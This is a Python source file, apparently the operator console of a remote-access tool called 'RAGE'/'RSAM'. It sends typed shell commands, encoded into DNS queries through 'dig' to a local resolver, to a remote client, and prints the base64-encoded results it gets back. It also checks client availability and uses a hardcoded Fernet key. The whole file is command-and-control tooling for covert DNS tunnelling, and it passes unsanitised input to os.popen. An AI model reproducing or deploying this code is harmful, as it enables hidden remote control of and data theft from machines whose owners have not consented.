'''import base64
import os
import time
from progress.bar import PixelBar as Bar

def send_data():
    try:
        os.remove('file')
    except:
        pass
    #-------------------------------------------------------------------------------------------
    cmd = input("rage@rsam ~: ")

    if ' ' in cmd:
        cmd = cmd.replace(' ','#@')

    if cmd == ' ':
        cmd = 'none'
    

    if '.' in cmd:
        cmd = cmd.replace('.','##')
    #os.popen(f'dig {req_data}.example.com @127.0.0.1 -p 5333')

    print(cmd)
    os.popen(f'dig {cmd}.example.com @127.0.0.1 -p 5333')

    #--------------------------------------------------------------------------------------------
    while True:
        try:

            with open('file','r') as f:
                read = f.read()
                f_decode = base64.b64decode(read).decode()

                if 'cmVkYQ==' in read:
                    print(f_decode)
                    break

                if read == 'cmVkYQ==':
                    print('[**] No Such File / ')
                else:
                    continue


        except:
            bar = Bar('Processing Data ', max=15000,  suffix='')
            for i in range(25000):
                    #time.sleep
                    # Do some work
                bar.next()
                
            bar.finish()
            
            pass


while True:
    send_data()'''

from ast import Try
import base64
from importlib.util import set_loader

from tabnanny import check
from turtle import right
import pyfiglet
import random
import emoji
from progress.spinner import PixelSpinner as Bar
import os
from datetime import date
from time import strftime
import time
import socket
from cryptography.fernet import Fernet
import sys

class console():
    def __init__(self) -> None:
        self.blue = '\033[34;1m'
        self.red = '\033[31;1m'
        self.yellow = '\033[33;1m'
        self.cyan = '\033[36;1m'
        self.white = '\033[37;1m'
        self.green = '\033[32;1m'
        self.connection = False

    def random_color(self):


        random_col = random.choice([self.blue,self.red,self.yellow,self.cyan,self.white])
        return random_col

    def run(self):
        self.dislplay()
        #self.check_connection()
        
        #if self.connection == True:
        #    self.send_data()
        #else:
        #    print(self.red+"[*] Unable To Connect To Server\nExecute 'check' on program's Shell")
        while True:
            try:
                self.send_data()
            except KeyboardInterrupt:
                print('\033[36;1m'+'\n thanks for using my program, it will be nice to see you back again.'.title()+str(emoji.emojize(' :crying_face: ', language='alias')))
                sys.exit(1)
            


    def dislplay(self):

        print(self.random_color() ,pyfiglet.figlet_format("RAGE",font='cyberlarge',justify='center'))
        #print(emoji.emojize(' :right_arrow: Checking Version : ', language='alias'))
        right = emoji.emojize(' :right_arrow: ', language='alias')
        bar =  Bar(f'{right}Checking Version ', max=100,  suffix='')
        for i in range(2500):
                    #time.sleep
                    # Do some work
            bar.next()
        print('    : \tok')
        bar.finish()



        #-----------------------------------------------------------------------------------
        right = emoji.emojize(' :right_arrow: ', language='alias')
        try:
            #os.remove('size')
            #os.remove('file')
            pass
        except:
            bar =  Bar(f'{right}Clearing Old Files ', max=100,  suffix='')
            for i in range(2500):
                        #time.sleep
                        # Do some work
                bar.next()
            print('  : \tok')
            bar.finish()

        #-------------------------------------------------------------------------------------
        right = emoji.emojize(" :eight_o’clock: ", language='alias')
        
        date_tod = date.today()
        print(right,date_tod.strftime("%B %d, %Y"),strftime("%H:%M:%S"))

        print('\n Welcome '+"`"+socket.gethostname()+"`"+' glad to see you again !!')

        #---------------------------------------------------------------------------------------
        
        #---------------------------------------------------------------------------------------
        code_exec = '''
                    RSAM EXECUTION
                    └── listner.py
                        └── server.py/client.py
                    '''
        print(self.green+ '\n Follow The Program execution Please\n'+self.white+code_exec)
        #---------------------------------------------------------------------------------------
        print_server = False
        while True:
            try:
            
                with open('size','r') as s:
                    key = 'Do26L9v-jcv7Bom0-1l0qg6FcoVlfG9oMyZnuxFSMNA='
                    f = Fernet(key)


                    s = f.decrypt(s.read().encode())

                    
                    if s.decode() =='r4gE 5eRVEr 1N1714L15Ed':
                        print(self.green +'\n Server Initialised')
                        break
                        
                        

            except:
                if print_server == False:
                    print(self.red +'\n Server Not Initialised\n Waiting For Server ....'+self.blue)
                print_server = True

                time.sleep(1)
                bar =  Bar(f'{right}Waiting ', max=100000,  suffix='')
                for i in range(100000):
                        #time.sleep
                        # Do some work
                   bar.next()
                bar.finish()
                continue
                #print(self.red +'\n Server Not Initialised\nWaiting For Server ....')


        #--------------------------------------------------------------------------------------------

    def check_connection(self):
        
        i = 0
        while i<50:
            try:
                i += 1
                with open('client','r') as cc:
                    cc= cc.read()
                    if 'init' in cc:
                        self.connection = True
                        #break
                    else:
                        self.connection = False
                        

                return self.connection
            except:
                continue
                #raise "Unable To Read File"

            

    def send_data(self):
        #-------------------------------------------------------------------------------------------
        right_curve = emoji.emojize(' :left_arrow_curving_right: ', language='alias')


        #---------------------------------------INPUT-----------------------------------------------
        cmd = input(right_curve+self.blue+"rage"+self.yellow+"@"+self.blue+"rsam ~:")
        #---------------------------------------INPUT-----------------------------------------------
        exc_cmd = True
        if ' ' in cmd:
            cmd = cmd.replace(' ','#@')

        if cmd == ' ':
            cmd = 'none'
        

        if '.' in cmd:
            cmd = cmd.replace('.','##')
            

        if 'rcheck' in cmd:
            exc_cmd = False
            self.check_connection()
            if self.connection == True:
                print(self.green+'[*] Client Available')            
            if self.connection == False:
                print(self.red+'[*] Client Unvailable')
        #os.popen(f'dig {req_data}.example.com @127.0.0.1 -p 5333')

        if exc_cmd == True:
            print(self.cyan+'\n',cmd)
            os.popen(f'dig {cmd}.example.com @127.0.0.1 -p 5333')

            #--------------------------------------------------------------------------------------------
            time.sleep(0.5)
            while True:
                try:

                    with open('file','r') as f:
                        read = f.read()
                        f_decode = base64.b64decode(read).decode()

                        if 'cmVkYQ==' in read:
                            print(self.yellow+f_decode.replace('reda',''))
                            os.remove('file')
                            break

                        if read == 'cmVkYQ==':
                            print('[**] No Such File / ')
                        else:
                            continue


                except:
                    bar = Bar('Processing Data ', max=15000,  suffix='')
                    for i in range(25000):
                            #time.sleep
                            # Do some work
                        bar.next()
                        
                    bar.finish()
                    
                    pass




if __name__ == '__main__':
    run = console()
    run.run()
  

            ##print('\033[36;1m'+'\n thanks for using my program, it will be nice to see you back again.'.title()+str(emoji.emojize(' :crying_face: ', language='alias')))
    
